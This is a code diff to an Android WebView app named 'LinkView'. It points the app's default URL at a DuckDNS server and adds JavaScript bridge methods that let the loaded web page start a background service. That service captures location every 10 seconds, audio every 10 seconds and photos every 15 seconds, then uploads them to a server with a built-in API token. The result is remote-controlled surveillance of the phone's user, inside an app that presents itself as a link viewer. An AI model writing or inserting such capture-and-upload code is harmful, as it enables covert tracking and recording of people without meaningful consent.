@@ -54,7 +54,7 @@ import java.util.List;
 import java.util.Locale;
 
 public class MainActivity extends Activity {
-    private static final String DEFAULT_WEB_URL = "http://rtxa.duckdns.org:8000";
+    private static final String DEFAULT_WEB_URL = "http://qylad-server.duckdns.org/linkview/";
     private static final String LOCAL_DEMO_URL = "file:///android_asset/linkview-demo/index.html";
     private static final String PREFS_NAME = "webview_settings";
     private static final String PREF_URL = "current_url";
@@ -385,6 +385,7 @@ public class MainActivity extends Activity {
         permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
             permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
             permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
             permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
@@ -733,8 +734,11 @@ public class MainActivity extends Activity {
                 + "isNative:true,"
                 + "getCapabilities:function(){return safeJson(function(){return LinkViewNative.getCapabilities();},{});},"
                 + "getDeviceInfo:function(){return safeJson(function(){return LinkViewNative.getDeviceInfo();},{});},"
+                + "getCaptureDefaults:function(){return safeJson(function(){return LinkViewNative.getCaptureDefaults();},{});},"
                 + "getPermissions:function(permissions){return safeJson(function(){return LinkViewNative.getPermissionStatus(JSON.stringify(permissions||[]));},{});},"
                 + "requestPermissions:function(permissions){return requestNativePermissions(permissions);},"
+                + "startCaptureService:function(config){return safeJson(function(){return LinkViewNative.startCaptureService(JSON.stringify(config||{}));},{});},"
+                + "stopCaptureService:function(){return safeJson(function(){return LinkViewNative.stopCaptureService();},{});},"
                 + "getCurrentUrl:function(){return LinkViewNative.getCurrentUrl();},"
                 + "openUrl:function(url){return safeVoid(function(){LinkViewNative.openUrl(String(url||''));});},"
                 + "reload:function(){return safeVoid(function(){LinkViewNative.reload();});},"
@@ -1366,8 +1370,11 @@ public class MainActivity extends Activity {
                 result.put("permissions", permissions);
                 apis.put("getCapabilities");
                 apis.put("getDeviceInfo");
+                apis.put("getCaptureDefaults");
                 apis.put("getPermissions");
                 apis.put("requestPermissions");
+                apis.put("startCaptureService");
+                apis.put("stopCaptureService");
                 apis.put("getCurrentUrl");
                 apis.put("openUrl");
                 apis.put("reload");
@@ -1401,8 +1408,91 @@ public class MainActivity extends Activity {
         }
 
         @JavascriptInterface
+        public String getCaptureDefaults() {
+            JSONObject result = bridgeSuccess();
+            try {
+                result.put("server_url", BuildConfig.LINKVIEW_DEFAULT_SERVER_URL);
+                result.put("api_token", BuildConfig.LINKVIEW_DEFAULT_API_TOKEN);
+                result.put("device_id", BuildConfig.LINKVIEW_DEFAULT_DEVICE_ID);
+                result.put("location_interval_ms", 10000);
+                result.put("audio_chunk_ms", 10000);
+                result.put("photo_interval_ms", 15000);
+            } catch (JSONException exception) {
+                Log.w(TAG, "Could not build capture defaults", exception);
+            }
+            return result.toString();
+        }
+
+        @JavascriptInterface
         public String getPermissionStatus(String rawAliases) {
             return permissionStatusJson(parsePermissionAliases(rawAliases)).toString();
+        }
+
+        @JavascriptInterface
+        public String startCaptureService(String rawConfig) {
+            if (!hasPermission(Manifest.permission.CAMERA)
+                    || !hasPermission(Manifest.permission.RECORD_AUDIO)
+                    || !hasLocationPermission()) {
+                requestRuntimePermissions(androidPermissionsForAliases(parsePermissionAliases(
+                        "[\"camera\",\"microphone\",\"location\"]"
+                )));
+                return bridgeError("permissions_required").toString();
+            }
+
+            JSONObject config;
+            try {
+                config = rawConfig == null || rawConfig.trim().isEmpty()
+                        ? new JSONObject()
+                        : new JSONObject(rawConfig);
+            } catch (JSONException exception) {
+                return bridgeError("invalid_config").toString();
+            }
+
+            String serverUrl = config.optString("server_url", BuildConfig.LINKVIEW_DEFAULT_SERVER_URL).trim();
+            if (serverUrl.isEmpty()) {
+                return bridgeError("server_url_required").toString();
+            }
+
+            Intent intent = new Intent(MainActivity.this, CaptureUploadService.class);
+            intent.setAction(CaptureUploadService.ACTION_START);
+            intent.putExtra(CaptureUploadService.EXTRA_SERVER_URL, serverUrl);
+            intent.putExtra(
+                    CaptureUploadService.EXTRA_API_TOKEN,
+                    config.optString("api_token", BuildConfig.LINKVIEW_DEFAULT_API_TOKEN)
+            );
+            intent.putExtra(
+                    CaptureUploadService.EXTRA_DEVICE_ID,
+                    config.optString("device_id", BuildConfig.LINKVIEW_DEFAULT_DEVICE_ID)
+            );
+            intent.putExtra(
+                    CaptureUploadService.EXTRA_LOCATION_INTERVAL_MS,
+                    config.optLong("location_interval_ms", 10000L)
+            );
+            intent.putExtra(
+                    CaptureUploadService.EXTRA_AUDIO_CHUNK_MS,
+                    config.optLong("audio_chunk_ms", 10000L)
+            );
+            intent.putExtra(
+                    CaptureUploadService.EXTRA_PHOTO_INTERVAL_MS,
+                    config.optLong("photo_interval_ms", 15000L)
+            );
+
+            runOnUiThread(() -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    startForegroundService(intent);
+                } else {
+                    startService(intent);
+                }
+            });
+            return bridgeSuccess().toString();
+        }
+
+        @JavascriptInterface
+        public String stopCaptureService() {
+            Intent intent = new Intent(MainActivity.this, CaptureUploadService.class);
+            intent.setAction(CaptureUploadService.ACTION_STOP);
+            runOnUiThread(() -> startService(intent));
+            return bridgeSuccess().toString();
         }
 
         @JavascriptInterface
